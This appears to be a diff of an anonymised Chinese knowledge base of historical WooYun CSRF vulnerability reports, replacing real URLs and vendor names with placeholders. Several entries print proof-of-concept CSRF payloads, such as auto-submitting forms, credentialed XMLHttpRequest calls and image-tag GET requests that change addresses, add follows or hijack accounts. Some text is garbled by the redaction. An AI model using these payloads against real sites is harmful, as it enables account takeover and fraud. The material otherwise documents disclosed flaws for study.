+**POC**: {"code":0,"msg":"保存成功","comment":{"content":"aaa","passport":"Zmx5bml1QHNvaHUuY29t","id":505509840,"createtime":1450701667232,"unick":"123","uavatar":"https://example.com/[已脱敏]","ulink":"http://#######.blog.sohu.com/","topassport":"MTE1MjcxMzAyM0BxcS5jb20=","sname":"#
 
 **绕过**: 直接利用
 
@@ -3183,7 +3183,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.19lou.com/user/message/send都没验证码 token referrer检查，问题不只这一个了 许多都不做token httponly也撤掉了。。挺危险的……
+**详情**: https://example.com/[已脱敏] token referrer检查，问题不只这一个了 许多都不做token httponly也撤掉了。。挺危险的……
 
 **POC**: 无
 
@@ -3205,7 +3205,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 修改收货地址，抓包查看：其中无不可预测参数，伪造csrf链接，主要代码：xmlhttp.open("POST", "http://www.ewj.com/ewj_ucenter/handler/address_save_handler.jsx", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("loginId=woo2&id=addr_3130650&userName=woo2&region_1=c_region_11001&region_2=c_region_11035&region_3=c_region_11380&RegionId=c_region_11380&RegionTem
+**详情**: 修改收货地址，抓包查看：其中无不可预测参数，伪造csrf链接，主要代码：xmlhttp.open("POST", "https://example.com/[已脱敏]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("loginId=woo2&id=addr_3130650&userName=woo2&region_1=c_region_11001&region_2=c_region_11035&region_3=c_region_11380&RegionId=c_region_11380&RegionTem
 
 **POC**: 以证明
 
@@ -3215,7 +3215,7 @@
 ---
 
 ---
-### [wooyun-2014-055473] 土豆-新浪 OAuth 2.0 redirect_uri CSRF 漏洞
+### [wooyun-2014-055473] 土豆-某社交平台 OAuth 2.0 redirect_uri CSRF 漏洞
 **厂商**: 土豆网 | **年份**: 2014 | **类型**: CSRF
 
 **元思考**: 触发信号: 认证接口
@@ -3227,7 +3227,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 土豆-新浪 OAuth 2.0 认证流程中https://api.weibo.com/oauth2/authorize?client_id=2043051649&redirect_uri=http://login.tudou.com/xiaonei/connect/activeBack.action&response_type=code&state=2土豆并没有提供有效方式抵抗针对redirect_uri 的CSRF 攻击。如果攻击者重新发起一个土豆-新浪  OAuth 2.0 认证请求，并截获OAuth 2.0 认证请求的返回。http://login.tudou.com/xiaonei/connect/activeBack.action?state=2&code=ac331d1522fe37fd7d7ad19e501b8393攻击者诱骗已经登录的网用户点击（或者诱骗访问其attacke
+**详情**: 土豆-某社交平台 OAuth 2.0 认证流程中https://example.com/[已脱敏] 的CSRF 攻击。如果攻击者重新发起一个土豆-某社交平台  OAuth 2.0 认证请求，并截获OAuth 2.0 认证请求的返回。https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -3249,9 +3249,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://i.boqii.com发送get请求添加关注
+**详情**: https://example.com/[已脱敏]
 
-**POC**: POC:<html><img src="http://i.boqii.com/UcRelation/addCareOne/bUid/12820816" ></html>
+**POC**: POC:<html><img src="https://example.com/[已脱敏]" ></html>
 
 **绕过**: 直接利用
 
@@ -3271,9 +3271,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://m.kadang.com/mobile/wap/user/login/page.htm?redirectURL=http://m.kadang.com/mobile/wap/wuliu/entry.htm问题出在这里，没有验证码，也没次数限制密码是123123123对不对呢，我们登录下是对的。以上的危害就算说小把假如那天你购物，“突然”你的上面的地址写北京快递员跑别的城市去了，还被签收了，别怕，这时候要淡定，应为你的礼物在白帽子手里了。哈哈， 开玩笑的，白帽子是白的，不做黑事= =路人甲：赔我精神损失费路人丙： 赔我钱，我买的东西都被送别的地方去了路人乙：同上第二天：国内知名网站卡当网宣布退出互联网产业各路的互联网大佬以及要开礼物类网站的CEO们： 耶，又倒闭一个问题出在这里我们先看下访问之前然后添加地址确认是get请求偷笑。。。我们构造：http://www.kadang.
+**详情**: https://example.com/[已脱敏] 开玩笑的，白帽子是白的，不做黑事= =路人甲：赔我精神损失费路人丙： 赔我钱，我买的东西都被送别的地方去了路人乙：同上第二天：国内知名网站卡当网宣布退出互联网产业各路的互联网大佬以及要开礼物类网站的CEO们： 耶，又倒闭一个问题出在这里我们先看下访问之前然后添加地址确认是get请求偷笑。。。我们构造：https://example.com/[已脱敏]
 
-**POC**: http://m.kadang.com/mobile/wap/user/login/page.htm?redirectURL=http://m.kadang.com/mobile/wap/wuliu/entry.htm问题出在这里，没有验证码，也没次数限制密码是123123123对不对呢，我们登录下是对的。以上的危害就算说小把假如那天你购物，“突然”你的上面的地址写北京快递员跑别的城市去了，还被签收了，别怕，这时候要淡定，应为你的礼物在白帽子手里了。哈哈， 开玩笑的，白帽子是白的，不做黑事= =路人甲：赔我精神损失费路人丙： 赔我钱，我买的东西都被送别的地方去了路人乙：同上第二天：国内知名网站
+**POC**: https://example.com/[已脱敏] 开玩笑的，白帽子是白的，不做黑事= =路人甲：赔我精神损失费路人丙： 赔我钱，我买的东西都被送别的地方去了路人乙：同上第二天：国内知名网站
 
 **绕过**: 直接利用
 
@@ -3281,8 +3281,8 @@
 ---
 
 ---
-### [wooyun-2012-010451] 腾讯Q币CSRF漏洞
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: CSRF
+### [wooyun-2012-010451] 某互联网公司Q币CSRF漏洞
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -3293,7 +3293,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 在使用Q币转换成游戏币的接口中，存在CSRF问题，URL：http://account.play.qq.com:8080//cgi-bin/buyitem_present_yxb1?item_id=57&item_num=1这个是兑换1Q币的连接，item_id中的57代表1元，58代表2元，59代表10元，假如以图片形式夹带在空间或者邮件中或发给他人点击时，造成自动消费，本人在测试时就不小心把仅有的10Q币全部花掉了，变成游戏币，我擦，腾讯哥们能不能给我转回来啊。扒衣见君节快乐！由于涉及到个人Q币，评了个12。
+**详情**: 在使用Q币转换成游戏币的接口中，存在CSRF问题，URL：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -3315,7 +3315,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先查看配置文件：http://blog.ifeng.com/crossdomain.xml<cross-domain-policy><allow-access-from domain="*.ifeng.com" /></cross-domain-policy>嗯，就自己一个域，好像挺安全的，不像搜狐那样有三个可信域.以为搞不定，不过。。。上传头像处，没有检查内容，只是重命名了一下而已~得到恶意图片文件：http://mypic.ifeng.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/upload/2015/06/15/f2c667ac4357371d1434358956.jpg?1434358956然后..啪啪啪，读取用户信息并且添加友链结果在证明里~
+**详情**: 首先查看配置文件：https://example.com/[已脱敏] domain="*.ifeng.com" /></cross-domain-policy>嗯，就自己一个域，好像挺安全的，不像搜狐那样有三个可信域.以为搞不定，不过。。。上传头像处，没有检查内容，只是重命名了一下而已~得到恶意图片文件：https://example.com/[已脱敏]
 
 **POC**: 测试劫持添加友链：
 
@@ -3337,7 +3337,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 看了下那个链接的源代码，是通过人人逛街的接口提交的。接口地址http://j.renren.com/publisher/status，只要POST一个参数content到接口即可。这个页面post的content内容就是“已经结束了，这是我的自白XXXX”。
+**详情**: 看了下那个链接的源代码，是通过人人逛街的接口提交的。接口地址https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -3347,8 +3347,8 @@
 ---
 
 ---
-### [wooyun-2013-017167] 新浪微博CSRF刷粉丝
-**厂商**: 新浪微博 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-017167] 某社交平台某社交平台CSRF刷粉丝
+**厂商**: 某社交平台某社交平台 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -3361,7 +3361,7 @@
 
 **详情**: 没有对referer验证，没有加token导致
 
-**POC**: 登录新浪微博社会招聘：http://hr.weibo.com/jobs/index.php访问如下poc页面<html><body><form id="fxx" name="fxx" action="http://hr.weibo.com/api/add_friend.php" method="POST"><input type="text" name="uid" value="1981622273" /><input type="submit" value="submit" /></form><script>document.fxx.submit();</script></body></ht
+**POC**: 登录某社交平台某社交平台社会招聘：https://example.com/[已脱敏] id="fxx" name="fxx" action="https://example.com/[已脱敏]" method="POST"><input type="text" name="uid" value="1981622273" /><input type="submit" value="submit" /></form><script>document.fxx.submit();</script></body></ht
 
 **绕过**: 直接利用
 
@@ -3369,8 +3369,8 @@
 ---
 
 ---
-### [wooyun-2011-02093] 百度游戏频道存在iframe
-**厂商**: 百度 | **年份**: 2011 | **类型**: CSRF
+### [wooyun-2011-02093] 某搜索引擎游戏频道存在iframe
+**厂商**: 某搜索引擎 | **年份**: 2011 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -3381,9 +3381,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 百度游戏频道(手机版)存在一个iframe...
+**详情**: 某搜索引擎游戏频道(手机版)存在一个iframe...
 
-**POC**: poc:http://youxi.m.baidu.com/softlist.php?cateid=77&phoneid=&url=%22%3E%3Ciframe%20src=http://wooyun.org/whitehats/Jacks%3E在这里精心构造下...嘿嘿~~用手机的一访问~~~~别做坏事啊~
+**POC**: poc:https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -3425,9 +3425,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.leiphone.com/修改资料存在CSRF ， 邮箱可找回密码POC
+**详情**: https://example.com/[已脱敏] ， 邮箱可找回密码POC
 
-**POC**: <html><body><form action="http://home.leiphone.com/info/index" method="POST"><input type="hidden" name="Profile&#91;nickname&#93;" value="wooyun7891" /><input type="hidden" name="Profile&#91;company&#93;" value="" /><input type="hidden" name="Profile&#91;position&#93;" value="" /><input type="hidden
+**POC**: <html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="Profile&#91;nickname&#93;" value="wooyun7891" /><input type="hidden" name="Profile&#91;company&#93;" value="" /><input type="hidden" name="Profile&#91;position&#93;" value="" /><input type="hidden
 
 **绕过**: 直接利用
 
@@ -3449,7 +3449,7 @@
 
 **详情**: 在接受POST信息时，未对POST来路(Referer)进行验证，对POST信息中的bid要求不严，导致漏洞产生。
 
-**POC**: 漏洞地址：http://www.aipai.com/space.php<html><body><form id="imlonghao" name="imlonghao" action="http://www.aipai.com/space.php" method="post"><input type="text" name="action" value="blog" /><input type="text" name="post" value="true" /><input type="text" name="comment" value="XX" /><input type="submit"
+**POC**: 漏洞地址：https://example.com/[已脱敏] id="imlonghao" name="imlonghao" action="https://example.com/[已脱敏]" method="post"><input type="text" name="action" value="blog" /><input type="text" name="post" value="true" /><input type="text" name="comment" value="XX" /><input type="submit"
 
 **绕过**: 直接利用
 
@@ -3457,8 +3457,8 @@
 ---
 
 ---
-### [wooyun-2016-0203945] 新浪微博手机客户端存在csrf漏洞
-**厂商**: 新浪 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2016-0203945] 某社交平台某社交平台手机客户端存在csrf漏洞
+**厂商**: 某社交平台 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -3493,7 +3493,7 @@
 
 **详情**: 
 
-**POC**: http://o2o.fanwe.net/index.php?ctl=uc_home开始啦，我就自己本地构造一些表单。只为了测试所以就简单点在本地的apache服务器上搭建就行了。第一个：poc.html（一个自动转播文章的csrf蠕虫页面），第二个：poc2.html（是一个自动关注的页面）！OK，下面我就随便注册了两个账号来测试，现在就附上截图证明一下！OK，现在可以看到我是只有一条的文章和还没关注的状态中！现在访问一下poc.html访问后页面返回的结果：{"status":1,"info":"\u8f6c\u53d1\u6210\u529f"}现在访问一下poc2页面，返回结果：{"t
+**POC**: https://example.com/[已脱敏]"status":1,"info":"\u8f6c\u53d1\u6210\u529f"}现在访问一下poc2页面，返回结果：{"t
 
 **绕过**: 直接利用
 
@@ -3515,7 +3515,7 @@
 
 **详情**: POST /group/topic/72292507/comments HTTP/1.1Host: m.douban.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:35.0) Gecko/20100101 Firefox/35.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: bid="/dhOdK89vh4"; viewed="1094797"; __utma=30149280.572967685.1408697184.1423144849.1423321947.68; 
 
-**POC**: <html><form action="http://m.douban.com/group/topic/72291905/comments" method=post><input type=text value="asdasdasdasdasooyun" name="content" /><input type=submit value="submit" /></form></html>
+**POC**: <html><form action="https://example.com/[已脱敏]" method=post><input type=text value="asdasdasdasdasooyun" name="content" /><input type=submit value="submit" /></form></html>
 
 **绕过**: 直接利用
 
@@ -3545,8 +3545,8 @@
 ---
 
 ---
-### [wooyun-2012-08721] 百度某处CSRF漏洞
-**厂商**: 百度 | **年份**: 2012 | **类型**: CSRF
+### [wooyun-2012-08721] 某搜索引擎某处CSRF漏洞
+**厂商**: 某搜索引擎 | **年份**: 2012 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -3559,7 +3559,7 @@
 
 **详情**: 在接受POST和GET的信息的时候，未对POST来路(Referer)进行验证，同时也没有在POST的信息中加token验证信息的正确性，导致漏洞产生。
 
-**POC**: 漏洞地址：http://wenku.baidu.com/submit<html><body><form id="imlonghao" name="imlonghao" action="http://wenku.baidu.com/submit" method="post"><input type="text" name="ct" value="20008" /><input type="text" name="doc_id" value="a4e806fd700abb68a982fbe9" /><input type="submit" value="submit" /></form><scri
+**POC**: 漏洞地址：https://example.com/[已脱敏] id="imlonghao" name="imlonghao" action="https://example.com/[已脱敏]" method="post"><input type="text" name="ct" value="20008" /><input type="text" name="doc_id" value="a4e806fd700abb68a982fbe9" /><input type="submit" value="submit" /></form><scri
 
 **绕过**: 直接利用
 
@@ -3567,8 +3567,8 @@
 ---
 
 ---
-### [wooyun-2013-025105] QQ空间中的几个漏洞结合利用
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2013-025105] 某互联网公司空间中的几个漏洞结合利用
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -3579,7 +3579,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: QQ空间有两个BUG可以结合利用:(1)URL里总是带着QQ号码,也就是说,可以通过来源referer得知当前用户的QQ;(2)日志的动态中图片如果是第三方网站图片的话,会把图片抓取到腾讯服务器上, 但如果腾讯抓取失败的时候, 第三方图就可直接显示,如果此图是php动态输出的话,很容易绕过采用php动态输出图片内容,如果腾讯抓取的话就返回空内容,如果有referer的话则提取QQ,然后跟脚QQ抓取当前用户的头像和昵称等,这样就可以整蛊当然,还可以用302跳转到某些get方式的投票地址,形成CSRF攻击
+**详情**: 某互联网公司空间有两个BUG可以结合利用:(1)URL里总是带着某互联网公司号码,也就是说,可以通过来源referer得知当前用户的某互联网公司;(2)日志的动态中图片如果是第三方网站图片的话,会把图片抓取到某互联网公司服务器上, 但如果某互联网公司抓取失败的时候, 第三方图就可直接显示,如果此图是php动态输出的话,很容易绕过采用php动态输出图片内容,如果某互联网公司抓取的话就返回空内容,如果有referer的话则提取某互联网公司,然后跟脚某互联网公司抓取当前用户的头像和昵称等,这样就可以整蛊当然,还可以用302跳转到某些get方式的投票地址,形成CSRF攻击
 
 **POC**: (见原文)
 
@@ -3589,8 +3589,8 @@
 ---
 
 ---
-### [wooyun-2010-0881] 新浪博客CSRF漏洞
-**厂商**: 新浪 | **年份**: 2010 | **类型**: CSRF
+### [wooyun-2010-0881] 某社交平台博客CSRF漏洞
+**厂商**: 某社交平台 | **年份**: 2010 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -3603,7 +3603,7 @@
 
 **详情**: 博客的权限设置为GET提交，可在博文中插入链接图片，致使目标用户开放权限。
 
-**POC**: 如http://control.blog.sina.com.cn/blogprofile/profilepower.php页面的权限设置。1.博文中插入http://control.blog.sina.com.cn/riaapi/conf/update_user_private.php?uid=***&privatekey=cms%2Cpageset%2Cinvitationset%2Cspamcms%2Cquote%2Cfoot%2Cisprivate&privatevalue=4%2C0%2C0%2C1%2C0%2C0%2C0 图片链接2.在用户登录的前提下，诱使用户点击此博文，可使用户I
+**POC**: 如https://example.com/[已脱敏] 图片链接2.在用户登录的前提下，诱使用户点击此博文，可使用户I
 
 **绕过**: 直接利用
 
@@ -3645,9 +3645,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 由于没给程序员发年终奖，三连发的缺陷。。精华这类操作都是get请求抓包得到地址：http://home.verycd.com/cp.php?ac=thread&op=digest&tagid=15626&tid=2815255&inajax=1看下是不是精了 O(∩_∩)O哈哈~
+**详情**: 由于没给程序员发年终奖，三连发的缺陷。。精华这类操作都是get请求抓包得到地址：https://example.com/[已脱敏] O(∩_∩)O哈哈~
 
-**POC**: 由于没给程序员发年终奖，三连发的缺陷。。精华这类操作都是get请求抓包得到地址：http://home.verycd.com/cp.php?ac=thread&op=digest&tagid=15626&tid=2815255&inajax=1看下是不是精了 O(∩_∩)O哈哈~
+**POC**: 由于没给程序员发年终奖，三连发的缺陷。。精华这类操作都是get请求抓包得到地址：https://example.com/[已脱敏] O(∩_∩)O哈哈~
 
 **绕过**: 直接利用
 
@@ -3667,7 +3667,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 修改用户资料，拦截包：修改成功：伪造csrf恶意链接，主要代码：xmlhttp.open("POST", "http://www.352.com/member/info/save_modify_member.do", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("account=woo99&sex=1&birthday=2015-07-01&marry=0&province=16&regCity=65&provinceAdd=16&city=67&regArea=&cellphoneNumber=13500000000&homeTelephoneNumber=010-88888888
+**详情**: 修改用户资料，拦截包：修改成功：伪造csrf恶意链接，主要代码：xmlhttp.open("POST", "https://example.com/[已脱敏]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("account=woo99&sex=1&birthday=2015-07-01&marry=0&province=16&regCity=65&provinceAdd=16&city=67&regArea=&cellphoneNumber=13500000000&homeTelephoneNumber=010-88888888
 
 **POC**: 听说你们很大方啊，求礼物！！
 
@@ -3689,7 +3689,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 向厂商发送地址处是GET，且请求无token，可和厂商配合定向钓白帽子联系方式（姓名电话邮编地址……）请求如下http://wooyun.org/actdo.php?action=sms&do=sendcontact&corpid=【厂商ID】&whitehatid=【白帽子id】厂商ID就不用说了，和厂商配合可以获取。白帽子ID可以打开该白帽子的页面，点一下“关注”并抓包，其中有白帽子的ID。只要先点击给该白帽子发礼物，再img src上面的地址给中招的白帽子，地址就乖乖地来了。
+**详情**: 向厂商发送地址处是GET，且请求无token，可和厂商配合定向钓白帽子联系方式（姓名电话邮编地址……）请求如下https://example.com/[已脱敏] src上面的地址给中招的白帽子，地址就乖乖地来了。
 
 **POC**: 请某厂商帮忙做了个测试
 
@@ -3713,7 +3713,7 @@
 
 **详情**: 关于此漏洞，相对其他web漏洞来说可能看起来危害不大，但是我觉得对于要求较高的无线路由器来讲，这对用户来说确实是算是安全性问题的。由于这个漏洞是CSRF token相关的，所以我文字说明原理为主。黑盒测试，耗费了快一天的时间来尝试，今天游戏都没来得及打。
 
-**POC**: 1.华为TD-LTE无线路由器，型号B593s-850，花500大洋买的，高大上的产品，支持插上U盘进行FTP共享等功能，覆盖距离可达250米，真远。主要存在的问题：它在设计上存在一个csrf token窃取问题，通过http://192.168.1.1/api/webserver/token可以在特定的情况下获取到你想要的管理员的token，建议增强随机token。（后面详细讲述）。还有就是关于CSRF利用的问题，首先，我尝试了referer校验，该设备没有采取referer校验（华为的安全性做得好，有了token也得试试referer）。其次，我分析了除了token之外的其他所有参数，没有
+**POC**: 1.华为TD-LTE无线路由器，型号B593s-850，花500大洋买的，高大上的产品，支持插上U盘进行FTP共享等功能，覆盖距离可达250米，真远。主要存在的问题：它在设计上存在一个csrf token窃取问题，通过http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -3733,9 +3733,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 问题应用：http://t.iqiyi.com/home
+**详情**: 问题应用：https://example.com/[已脱敏]
 
-**POC**: 发表"奇谈"的时候抓到了这个地址：http://t.iqiyi.com/api/feed/addChat.php没有token或者其他的随机参数。POST参数中：<input type="hidden" name="requestMethod" value="POST"><input type="hidden" name="requestURL" value="http" value="//t.iqiyi.com/api/feed/addChat.php"><input type="hidden" name="notsync" value=""><input type="hidden" nam
+**POC**: 发表"奇谈"的时候抓到了这个地址：https://example.com/[已脱敏] type="hidden" name="requestMethod" value="POST"><input type="hidden" name="requestURL" value="http" value="//t.iqiyi.com/api/feed/addChat.php"><input type="hidden" name="notsync" value=""><input type="hidden" nam
 
 **绕过**: 直接利用
 
@@ -3757,7 +3757,7 @@
 
 **详情**: 修改邮箱处未验证token，可通过一个精心构造的表单来修改用户的邮箱。由于邮箱需要唯一性，所以可以通过一个数组来随机抽取邮箱。
 
-**POC**: POC：<html><body><form name="csrf" action="http://tuchong.com/api/user/modify/" method="POST"><input type=text name=section value="basicinfo"></input><script>var email =['root1@wooyun.org','root2@wooyun.org','root3@wooyun.org','root4@wooyun.org','root5@wooyun.org','root6@wooyun.org','root7@wooyun.org
+**POC**: POC：<html><body><form name="csrf" action="https://example.com/[已脱敏]" method="POST"><input type=text name=section value="basicinfo"></input><script>var email =['root1@wooyun.org','root2@wooyun.org','root3@wooyun.org','root4@wooyun.org','root5@wooyun.org','root6@wooyun.org','root7@wooyun.org
 
 **绕过**: 直接利用
 
@@ -3777,9 +3777,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 360论坛回帖时，点击插入图片。图片地址为：http://bbs.360safe.com/member.php?mod=logging&action=logout&.jpg或者：http://%62%62%73%2E%33%36%30%73%61%66%65%2E%63%6F%6D/%6D%65%6D%62%65%72%2E%70%68%70?%6D%6F%64=%6C%6F%67%67%69%6E%67&%61%63%74%69%6F%6E=%6C%6F%67%6F%75%74&.jpg长宽随意。。输入验证码后点击发帖。发帖后刷新，就退出了。。。。
+**详情**: 360论坛回帖时，点击插入图片。图片地址为：https://example.com/[已脱敏]
 
-**POC**: 点击这个网址360论坛就退出：http://bbs.360safe.com/member.php?mod=logging&action=logout&.jpg
+**POC**: 点击这个网址360论坛就退出：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -3787,8 +3787,8 @@
 ---
 
 ---
-### [wooyun-2013-021151] 微信公众平台CSRF可导致公众账号被劫持
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-021151] 某互联网公司公众平台CSRF可导致公众账号被劫持
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -3801,7 +3801,7 @@
 
 **详情**: 虽只是一个小csrf，但考虑到对业务产生的影响，可劫持公众账号群发推送，故自评等级为高，如有不妥请调低。如图，绑定私人账号处，bind api没有采用任何token，故导致csrf。
 
-**POC**: 为真实模拟攻击场景，用了一朋友的公众账号来测试，测试前并未向其说明为测试。构造恶意page，引诱点击。<img src=http://mp.weixin.qq.com/cgi-bin/binduser?cgi=binduser&t=ajax-response&binduser=xxx>如图，已触发。此时用adminhelper或mphelper可用绑定账号向所有订阅用户群发推送。
+**POC**: 为真实模拟攻击场景，用了一朋友的公众账号来测试，测试前并未向其说明为测试。构造恶意page，引诱点击。<img src=https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -3809,8 +3809,8 @@
 ---
 
 ---
-### [wooyun-2013-017638] 新浪SAE普通开发者无需推荐快速认证
-**厂商**: 新浪 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-017638] 某社交平台SAE普通开发者无需推荐快速认证
+**厂商**: 某社交平台 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 认证接口
 
@@ -3821,9 +3821,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先去申请普通开发者认证，然后到新浪开发者论坛回复插入下面的代码，把XX换成你的。例如：http://sae.sina.com.cn/?m=home&a=devlevel&level=normal_level&voteme=XXXXX&makesure=1别人在登陆了SAE的情况下打开有该代码的帖子就会自动推荐你了。刚刚试了下，几个板块回了不超过10贴，20分钟左右就成功升级成普通开发者了。
+**详情**: 首先去申请普通开发者认证，然后到某社交平台开发者论坛回复插入下面的代码，把XX换成你的。例如：https://example.com/[已脱敏]
 
-**POC**: http://sae.sina.com.cn/?m=home&a=devlevel&level=normal_level&voteme=wooyun&makesure=1
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -3887,7 +3887,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 评论区是测试效果http://www.bilibili.tv/video/av973850/收藏:http://www.bilibili.tv/m/stow?aid=973850&ajax=1&dopost=save&stow_target=stow&src=1.jpg发评论:http://interface.bilibili.cn/feedback/post?msg=By%E9%93%B6%E5%86%A5%E5%B8%81&aid=973850&action=send&src=1.jpg关注:http://interface.bilibili.cn/feedback/agreement?mode=arc&aid=973850&rid=13838573&src=1.jpg直接放到个人空间css里面,进去就自动评论关注收藏...现在已经撤掉css了
+**详情**: 评论区是测试效果https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -3897,8 +3897,8 @@
 ---
 
 ---
-### [wooyun-2015-0164471] 淘宝网CSRF添加收货地址
-**厂商**: 淘宝网 | **年份**: 2015 | **类型**: CSRF
+### [wooyun-2015-0164471] 某电商平台网CSRF添加收货地址
+**厂商**: 某电商平台网 | **年份**: 2015 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -3909,7 +3909,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1、http://member1.taobao.com/member/fresh/deliver_address.htm2、3、<html><body><form action="http://member1.taobao.com/member/fresh/deliver_address.htm" method="POST"><input type="hidden" name="action" value="DeliverAddressMgr" /><input type="hidden" name="event&#95;submit&#95;do&#95;save" value="anything" /><input type="hidden" name="from" value="mbis" /><input type="hidden" name="isFrame" value="fa
+**详情**: 1、https://example.com/[已脱敏] action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="action" value="DeliverAddressMgr" /><input type="hidden" name="event&#95;submit&#95;do&#95;save" value="anything" /><input type="hidden" name="from" value="mbis" /><input type="hidden" name="isFrame" value="fa
 
 **POC**: (见原文)
 
@@ -3933,7 +3933,7 @@
 
 **详情**: 
 
-**POC**: 废话就不多说了，直接上图和贴上CSRF POC的代码。开启抓包工具，然后点击关注进行抓包，抓包的请求数据我就不说了。抓包请求数据简单的讲述：向/user/follow这个目录提交：user=ID他是没有token验证的。下面我们构造一个POC表单！代码如下：<html><head><meta charset="utf-8"><title>SCRF POC</title></head><body><form action="http://www.codoon.com/user/follow" method="post"><input type="hidden" name="user" value
+**POC**: 废话就不多说了，直接上图和贴上CSRF POC的代码。开启抓包工具，然后点击关注进行抓包，抓包的请求数据我就不说了。抓包请求数据简单的讲述：向/user/follow这个目录提交：user=ID他是没有token验证的。下面我们构造一个POC表单！代码如下：<html><head><meta charset="utf-8"><title>SCRF POC</title></head><body><form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="user" value
 
 **绕过**: 直接利用
 
@@ -3941,7 +3941,7 @@
 ---
 
 ---
-### [wooyun-2013-027258] 搜狐微博应该是最后一枚高危GET型CSRF发微博蠕虫
+### [wooyun-2013-027258] 搜狐某社交平台应该是最后一枚高危GET型CSRF发某社交平台蠕虫
 **厂商**: 搜狐 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 认证接口
@@ -3953,7 +3953,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 微直播处可发表微博。虽然请求是POST，但GET也可。所以，POC为加载一张图片：http://t.sohu.com/live/insertw?lid=3670&msg=csrftest如果你在看到上面被加载的“图片”时登陆了搜狐帐号（且搜狐未修复），那么你的微博帐号会发出一条内容为“csrftest”的微博。
+**详情**: 微直播处可发表某社交平台。虽然请求是POST，但GET也可。所以，POC为加载一张图片：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -3975,7 +3975,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1. 乌云zone上传头像地方没有检验,可以上传swf文件.你们可以看我帅气的头像http://zone.wooyun.orghttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/avatar/avatar_12_b.jpg2. 发表帖子时,可以加载任意的swf,此时swf容器的allownetworking值为internal.你们可以看我帅气的回复http://zone.wooyun.org/content/62523. 你们都知道了.接下来就是写一个可以读取zone的token并且向指定的帖子发起感谢如果贪心的话可以while(1){do}的swf,然后传到zone自己的头像,然后发一个帖子,题目就叫<叫你不要点点一次一wb>
